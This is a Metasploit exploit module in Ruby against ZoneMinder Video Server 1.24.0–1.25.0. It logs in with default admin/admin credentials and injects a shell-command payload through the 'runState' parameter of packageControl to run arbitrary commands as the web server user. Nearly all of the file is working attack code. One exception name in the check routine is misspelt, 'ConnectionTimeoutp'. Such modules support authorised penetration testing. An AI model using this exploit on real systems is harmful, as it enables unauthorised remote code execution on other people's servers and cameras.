##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => 'ZoneMinder Video Server packageControl Command Execution',
            'Description'    => %q{
                This module exploits a command execution vulnerability in ZoneMinder Video
                Server version 1.24.0 to 1.25.0 which could be abused to allow
                authenticated users to execute arbitrary commands under the context of the
                web server user. The 'packageControl' function in the
                'includes/actions.php' file calls 'exec()' with user controlled data
                from the 'runState' parameter.
            },
            'References'     =>
                [
                    ['URL', 
'http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/'],
                ],
            'Author'         =>
                [
                    'Brendan Coles <bcoles[at]gmail.com>', # Discovery and exploit
                ],
            'License'        => MSF_LICENSE,
            'Privileged'     => true,
            'Arch'           => ARCH_CMD,
            'Platform'       => 'unix',
            'Payload'        =>
                {
                    'BadChars'    => "\x00",
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                            'RequiredCmd' => 'generic telnet python perl bash',
                        },
                },
            'Targets'        =>
                [
                    ['Automatic Targeting', { 'auto' => true }]
                ],
            'DefaultTarget'  => 0,
            'DisclosureDate' => "Jan 22 2013",
        ))
 
        register_options([
            OptString.new('USERNAME',  [true, 'The ZoneMinder username', 'admin']),
            OptString.new('PASSWORD',  [true, 'The ZoneMinder password', 'admin']),
            OptString.new('TARGETURI', [true, 'The path to the web application', '/zm/'])
        ], self.class)
    end
 
    def check
 
        peer    = "#{rhost}:#{rport}"
        base    = target_uri.path
        base    << '/' if base[-1, 1] != '/'
        user    = datastore['USERNAME']
        pass    = datastore['PASSWORD']
        cookie  = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
        data    = "action=login&view=version&username=#{user}&password=#{pass}"
 
        # login and retrieve software version
        print_status("#{peer} - Authenticating as user '#{user}'")
        begin
            res = send_request_cgi({
                'method' => 'POST',
                'uri'    => "#{base}index.php",
                'cookie' => "#{cookie}",
                'data'   => "#{data}",
            })
            if res and res.code == 200
                if res.body =~ /<title>ZM - Login<\/title>/
                    print_error("#{peer} - Authentication failed")
                    return Exploit::CheckCode::Unknown
                elsif res.body =~ /v1.2(4\.\d+|5\.0)/
                    return Exploit::CheckCode::Appears
                elsif res.body =~ /<title>ZM/
                    return Exploit::CheckCode::Detected
                end
            end
            return Exploit::CheckCode::Safe
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeoutp
            print_error("#{peer} - Connection failed")
        end
        return Exploit::CheckCode::Unknown
 
    end
 
    def exploit
 
        @peer    = "#{rhost}:#{rport}"
        base     = target_uri.path
        base    << '/' if base[-1, 1] != '/'
        cookie   = "ZMSESSID=" + rand_text_alphanumeric(rand(10)+6)
        user     = datastore['USERNAME']
        pass     = datastore['PASSWORD']
        data     = "action=login&view=postlogin&username=#{user}&password=#{pass}"
        command  = Rex::Text.uri_encode(payload.encoded)
 
        # login
        print_status("#{@peer} - Authenticating as user '#{user}'")
        begin
            res = send_request_cgi({
                'method' => 'POST',
                'uri'    => "#{base}index.php",
                'cookie' => "#{cookie}",
                'data'   => "#{data}",
            })
            if !res or res.code != 200 or res.body =~ /<title>ZM - Login<\/title>/
                fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
        print_good("#{@peer} - Authenticated successfully")
 
        # send payload
        print_status("#{@peer} - Sending payload (#{command.length} bytes)")
        begin
            res = send_request_cgi({
                'method'    => 'POST',
                'uri'       => "#{base}index.php",
                'data'      => "view=none&action=state&runState=start;#{command}%26",
                'cookie'    => "#{cookie}"
            })
            if res and res.code == 200
                print_good("#{@peer} - Payload sent successfully")
            else
                fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Sending payload failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
 
    end
 
end
